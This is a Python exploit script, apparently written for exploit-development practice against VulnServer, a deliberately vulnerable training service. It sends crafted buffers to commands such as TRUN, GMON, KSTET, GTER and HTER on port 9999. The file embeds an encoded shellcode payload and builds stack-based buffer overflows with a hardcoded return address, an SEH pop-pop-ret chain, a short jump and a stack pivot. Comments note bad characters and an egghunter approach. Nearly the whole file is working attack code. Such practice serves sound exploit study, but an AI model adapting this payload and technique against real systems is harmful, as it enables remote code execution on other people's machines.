import struct
import sys
import socket

target = sys.argv[1]

shellcode =  b"\x90"*20
shellcode += b"\xdd\xc2\xba\x40\xf3\x7e\xbd\xd9\x74\x24\xf4"
shellcode += b"\x5f\x33\xc9\xb1\x31\x31\x57\x18\x83\xc7\x04"
shellcode += b"\x03\x57\x54\x11\x8b\x41\xbc\x57\x74\xba\x3c"
shellcode += b"\x38\xfc\x5f\x0d\x78\x9a\x14\x3d\x48\xe8\x79"
shellcode += b"\xb1\x23\xbc\x69\x42\x41\x69\x9d\xe3\xec\x4f"
shellcode += b"\x90\xf4\x5d\xb3\xb3\x76\x9c\xe0\x13\x47\x6f"
shellcode += b"\xf5\x52\x80\x92\xf4\x07\x59\xd8\xab\xb7\xee"
shellcode += b"\x94\x77\x33\xbc\x39\xf0\xa0\x74\x3b\xd1\x76"
shellcode += b"\x0f\x62\xf1\x79\xdc\x1e\xb8\x61\x01\x1a\x72"
shellcode += b"\x19\xf1\xd0\x85\xcb\xc8\x19\x29\x32\xe5\xeb"
shellcode += b"\x33\x72\xc1\x13\x46\x8a\x32\xa9\x51\x49\x49"
shellcode += b"\x75\xd7\x4a\xe9\xfe\x4f\xb7\x08\xd2\x16\x3c"
shellcode += b"\x06\x9f\x5d\x1a\x0a\x1e\xb1\x10\x36\xab\x34"
shellcode += b"\xf7\xbf\xef\x12\xd3\xe4\xb4\x3b\x42\x40\x1a"
shellcode += b"\x43\x94\x2b\xc3\xe1\xde\xc1\x10\x98\xbc\x8f"
shellcode += b"\xe7\x2e\xbb\xfd\xe8\x30\xc4\x51\x81\x01\x4f"
shellcode += b"\x3e\xd6\x9d\x9a\x7b\x28\xd4\x87\x2d\xa1\xb1"
shellcode += b"\x5d\x6c\xac\x41\x88\xb2\xc9\xc1\x39\x4a\x2e"
shellcode += b"\xd9\x4b\x4f\x6a\x5d\xa7\x3d\xe3\x08\xc7\x92"
shellcode += b"\x04\x19\xa4\x75\x97\xc1\x05\x10\x1f\x63\x5a"

def convert_string(shellcode):
    s = ""
    
    for ch in range(0,len(shellcode)):
        h = hex(shellcode[ch])[2:].zfill(2)
        s = s + h[0] + h[1]
    print(s)
    return s.encode()

def exploit5(target,port):
    
    print(f"[!] Target: {target} Port: {port}")
    buf = b"HTER "
    sh = convert_string(shellcode)
    buf += b"A"*2041 + b"bb115062" + sh + b"C"*(2860-len(sh))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(b"")
    res = s.recv(1024)
    print(res)

    s.send(buf)
    s.close()

def exploit4(target,port):
    
    print(f"[!] Target: {target} Port: {port}")
    buf = b"GTER "
    buf += b"A"*151 + b"B"*4 + b"C"*1000            # C is still 20 bytes max on stack.

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(b"")
    res = s.recv(1024)
    print(res)
   
    s.send(b"GDOG " + b"D"*1000)                               # Use it with correct branch that will save input on stack which can be later used with egghunter to search for shellcode
    res = s.recv(1024)
    print(res)

    s.send(buf)
    s.close()

def exploit3(target,port):
    
    print(f"[!] Target: {target} Port: {port}")
    buf = b"KSTET "
    buf += b"A"*70 + b"B"*4 + b"C"*1000          # C only 0n20 bytes written on stack

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(b"")
    res = s.recv(1024)
    print(res)

    s.send(buf)
    s.close()

def exploit2(target,port):
    
    buf = b"GMON "
    buf += b"\x2f"
    buf += b"\x90"*50 + shellcode + b"A"*(3550-len(shellcode)-50)
    buf += b"\x90\x90\xeb\x05"                          # short jump of 5 bytes
    buf += struct.pack("<L",0x625011ef)                 # pop; pop; ret
    buf += b"\x90\x90\x66\x81\xc4\x6e\x05\xff\xe4"              # add sp,1390; jmp esp
    buf += b"C"*1000       # C pointed by esp+154 and A pointed by esp+1390

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"[!] Target: {target} Port: {port}")
    s.connect((target, port))
    s.send(b"")
    res = s.recv(1024)
    print(res)

    s.send(buf)
    s.close()


def exploit(target,port):
    #bad chars = NULL

    buf = b"TRUN "
    buf += b"\x2e"
    buf += b"A"*2006 + struct.pack("<L",0x625011bb) + shellcode

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(b"")
    res = s.recv(1024)

    s.send(buf)
    s.close()

if __name__=="__main__":
    try:
        port = int(sys.argv[2])
    except:
        port = 9999

    exploit4(target,port)
